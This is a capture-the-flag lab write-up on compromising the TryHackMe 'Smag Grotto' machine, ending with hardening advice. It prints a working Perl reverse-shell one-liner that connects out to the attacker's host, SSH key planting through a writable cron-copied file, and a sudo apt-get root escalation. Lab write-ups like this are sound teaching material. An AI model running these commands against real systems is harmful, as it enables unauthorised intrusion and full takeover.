<p align="center">
  THM : Smag Grotto<br>
  Difficulty : Easy<br>
  <img src="https://i.imgur.com/o08Runb.png">
</p>

## Table of contents
- [Step 1 : Nmap Scan](#step-1--nmap-scan)
- [Step 2 : Website enumeration](#step-2--website-enumeration)
- [Step 3 : Exploiting the website to get a reverse-shell](#step-3--exploiting-the-website-to-get-a-reverse-shell)
- [Step 4 : Get access to another user than www-data](#step-4--get-access-to-another-user-than-www-data)
- [Final step : Privilège escalation](#final-step--privilege-escalation)
- [Conclusion](#conclusion)


## Step 1 : NMAP Scan
First , we need to scan the target to find open ports :  
```
attacker@AttackBox:~/Smag_Grotto$ nmap 10.10.121.229 -A -p- -oN nmapResults.txt
Starting Nmap 7.80 ( https://nmap.org ) at 2023-01-13 21:57 CET
Nmap scan report for 10.10.121.229
Host is up (0.063s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 74:e0:e1:b4:05:85:6a:15:68:7e:16:da:f2:c7:6b:ee (RSA)
|   256 bd:43:62:b9:a1:86:51:36:f8:c7:df:f9:0f:63:8f:a3 (ECDSA)
|_  256 f9:e7:da:07:8f:10:af:97:0b:32:87:c9:32:d7:1b:76 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Smag
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.49 seconds
```

We see 2 open ports :  
- port 22 for ssh  
- port 80 for http -> the target has a website that we can enumerate.  

## Step 2 : Website enumeration
Let's see the website  
![alt text](https://i.imgur.com/PSy4ni0.png)  
Ok, so now we know that this website is under development.  
I start a dirb scan on the target website.
```dirb http://10.10.121.229/ -o dirbResult```  
(Same as nmap, i always store dirb scan result in a file).  
```
attacker@AttackBox:~/Smag_Grotto$ dirb http://10.10.121.229/ -o dirbResult

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

OUTPUT_FILE: dirbResult
START_TIME: Fri Jan 13 22:13:29 2023
URL_BASE: http://10.10.121.229/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.121.229/ ----
+ http://10.10.121.229/index.php (CODE:200|SIZE:402)                                                                  
==> DIRECTORY: http://10.10.121.229/mail/                                                                             
+ http://10.10.121.229/server-status (CODE:403|SIZE:278)                                                              
                                                                                                                      
---- Entering directory: http://10.10.121.229/mail/ ----
+ http://10.10.121.229/mail/index.php (CODE:200|SIZE:2386)                                                            
                                                                                                                      
-----------------
END_TIME: Fri Jan 13 22:18:59 2023
DOWNLOADED: 9224 - FOUND: 3
```  

We see that dirb found a mail directory ! Let's see what we have at ```http://10.10.121.229/mail/```  
![alt text](https://i.imgur.com/uME2QT1.png)  
There is a pcap file. This can be really useful to find credentials used to connect to the target with diferrent protocols.  
Also, we have three possible logins : 
- ```netadmin@smag.thm```  
- ```uzi@smag.thm```  
- ```jake@smag.thm```  


We also maybe have a domain name : smag.thm  
![alt text](https://i.imgur.com/9p3t4NF.png)  



So we found some interesting things in this pcap file :   
- In the pcap file, there is a hostname : ```development.smag.thm```  
- There is also credentials used in a login.php page  

To access the website development section, I added the line ```10.10.121.229    development.smag.thm``` to the file ```/etc/hosts``` on my machine.  
Now, if I enter ```http://development.smag.thm/``` in the address bar, i enter the hidden development section of the website.  
![alt text](https://i.imgur.com/zSFc88j.png)  


There is two files in here :
- admin.php -> if not logged in, it redirects us to login.php.  
- login.php -> here we can use the credentials we found before in the pcap file.  


So let's try to use the credentials we found in the pcap file to login on the login.php page.
![alt text](https://i.imgur.com/SmbKqGc.png)  


And we are logged in !  
We are automatically redirected to admin.php.  
![alt text](https://i.imgur.com/puRBFr4.png)  

## Step 3 : Exploiting the website to get a reverse-shell
In this page, I tried ```ls``` and ```whoami``` but there was no output. But we can try to get a reverse shell with this command input. I used a perl reverse shell found at https://www.asafety.fr/reverse-shell-one-liner-cheat-sheet/  
```
perl -e 'use Socket;$i="10.x.x.x";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```  
So I set a netcat listener on port 1234. ```nc -lnvp 1234```, then I send the reverse shell command to the website, and I got a reverse shell !  
```
attacker@AttackBox:~/Smag_Grotto$ nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.14.32.60] from (UNKNOWN) [10.10.121.229] 55796
/bin/sh: 0: can't access tty; job control turned off
$
```

Let's get a bit more stable shell with python, ```python3 -c 'import pty; pty.spawn("/bin/bash")'```.  
```
attacker@AttackBox:~/Smag_Grotto$ nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.14.32.60] from (UNKNOWN) [10.10.121.229] 55798
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@smag:/var/www/development.smag.thm$
```

## Step 4 : Get access to another user than www-data
Now that we have a better shell, we can try to read the file ```/etc/passwd```to see users list on this machine ```cat /etc/passwd```.  
```
www-data@smag:/var/www/development.smag.thm$ cat /etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
jake:x:1000:1000:jake,,,:/home/jake:/bin/bash
sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin
www-data@smag:/var/www/development.smag.thm$
```

We have the user jake, remember, we saw this name before in the /mail directory of the website.  So maybe we can try to connect to the machine as jake. But how can do this ? First I looked in the jake's home directory ```/home/jake```.  
```
www-data@smag:/var/www/development.smag.thm$ ls -la /home/jake
total 60
drwxr-xr-x 4 jake jake 4096 Jun  5  2020 .
drwxr-xr-x 3 root root 4096 Jun  4  2020 ..
-rw------- 1 jake jake  490 Jun  5  2020 .bash_history
-rw-r--r-- 1 jake jake  220 Jun  4  2020 .bash_logout
-rw-r--r-- 1 jake jake 3771 Jun  4  2020 .bashrc
drwx------ 2 jake jake 4096 Jun  4  2020 .cache
-rw------- 1 root root   28 Jun  5  2020 .lesshst
-rw-r--r-- 1 jake jake  655 Jun  4  2020 .profile
-rw-r--r-- 1 root root   75 Jun  4  2020 .selected_editor
drwx------ 2 jake jake 4096 Jun  4  2020 .ssh
-rw-r--r-- 1 jake jake    0 Jun  4  2020 .sudo_as_admin_successful
-rw------- 1 jake jake 9336 Jun  5  2020 .viminfo
-rw-r--r-- 1 root root  167 Jun  5  2020 .wget-hsts
-rw-rw---- 1 jake jake   33 Jun  4  2020 user.txt
```

We can see that there is a file named ```.sudo_as_admin_successful```, that means that the user jake succesfully executed a command with sudo in the past. We can keep that in mind. We can't read any useful files, and we can't even go to the .ssh directory to try to find private ssh key... The next thing I've done was to check the crontab ```cat /etc/crontab```. 
```
www-data@smag:/var/www/development.smag.thm$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *    * * *   root	/bin/cat /opt/.backups/jake_id_rsa.pub.backup > /home/jake/.ssh/authorized_keys
#
```

One interesting thing here is that we have a cron task that copy ```/opt/.backups/jake_id_rsa.pub.backup``` to ```/home/jake/.ssh/authorized_keys```. The copied file is probably a public SSH key. After a little bit of research, I found something interesting about SSH public keys here : https://steflan-security.com/linux-privilege-escalation-exploiting-misconfigured-ssh-keys/. As I thought, it is possible to add our own public key to the authorized_keys file to then connect to the target without any password.  

So let's check if we can write to the ```/opt/.backups/jake_id_rsa.pub.backup```file with ```ls -l /opt/.backups/jake_id_rsa.pub.backup```.  
```
www-data@smag:/var/www/development.smag.thm$ ls -l /opt/.backups/jake_id_rsa.pub 
-rw-rw-rw- 1 root root 563 Jun  5  2020 /opt/.backups/jake_id_rsa.pub.backup
```

And we see that everybody can write to this file... Now we just have to create our own SSH keys and then copy our own public key to this file to connect with SSH as user jake. To generate our own keys, we need to use ```ssh-keygen -f jake_id_rsa```.  
```
attacker@AttackBox:~/Smag_Grotto$ ssh-keygen -f id_rsa
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in id_rsa
Your public key has been saved in id_rsa.pub
The key fingerprint is:
SHA256:Cf/fnbtB/zPfLmbbIFDzDO1wComNHtxr10+JYvWVPRI attacker@AttackBox
The key's randomart image is:
+---[RSA 3072]----+
|             E   |
|       . = . .. o|
|      . = = =oooo|
|       + o +.@+ +|
|        S +oo.=+.|
|         o.o. .o.|
|          . . ..o|
|           . o+*=|
|            .ooB&|
+----[SHA256]-----+
```


We now have two files :
- id_rsa -> the private key we are going to use to connect with SSH.
- id_rsa.pub -> the public key we need to copy to the ```/opt/.backups/jake_id_rsa.pub.backup``` file.  

I read the content of the public key file on my computer, and then I use ```echo '<MY PUBLIC KEY>' > /opt/.backups/jake_id_rsa.pub.backup``` on the target machine. Also, don't forget to set the right permissions for the private SSH key with ```chmod 600 jake_id_rsa```. And then we can connect with SSH as jake to the machine with ```ssh jake@10.10.121.229 -i jake_id_rsa```.  
```
attacker@AttackBox:~/Smag_Grotto$ chmod 600 id_rsa
attacker@AttackBox:~/Smag_Grotto$ ssh jake@10.10.121.229 -i id_rsa 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

Last login: Fri Jun  5 10:15:15 2020
jake@smag:~$
```

We are now logged in as jake ! And we can now get the user.txt flag using ```cat user.txt```  
```
jake@smag:~$ cat user.txt 
********************************
```

## Final step : Privilege Escalation
Now, it's time to get root ! Remember, we found a file named ```.sudo_as_admin_successful```, that means that user jake has already used a command with sudo in the past, so maybe jake has the permission to use a command with sudo without a password. To see this , we use ```sudo -l``` :  
```
jake@smag:~$ sudo -l
Matching Defaults entries for jake on smag:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on smag:
    (ALL : ALL) NOPASSWD: /usr/bin/apt-get
```

We see that user jake can use sudo apt-get, and so execute the apt-get command as root without any password ! Let's see on [GTFOBins](https://gtfobins.github.io/) if we can execute a shell by using apt-get.  
![](https://i.imgur.com/OQHoMBe.png)  

And yes we can ! By using ```sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh```.  
```
jake@smag:~$ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
# whoami
root
```

And we have a root shell ! Now we can get the root flag with ```cat /root/root.txt```.  
```
# cat /root/root.txt
*******************************
```

## Conclusion
- Mails shouldn't be publicly accessible.
- There shouldn't be a publicly accessible pcap file.
- www-data user should'nt have write permissions on the file ```/opt/.backups/jake_id_rsa_pub.backup```. Maybe we can change the owner of the file with ```chown jake /opt/.backups/jake_id_rsa_pub.backup```and then, delete the write permission for other users than jake with ```chmod 600 /opt/.backups/jake_id_rsa_pub.backup```. So now only user jake can read or write to this file.
- Maybe we can filter commands on the website to avoid reverse shells

Thanks for reading my first write up !
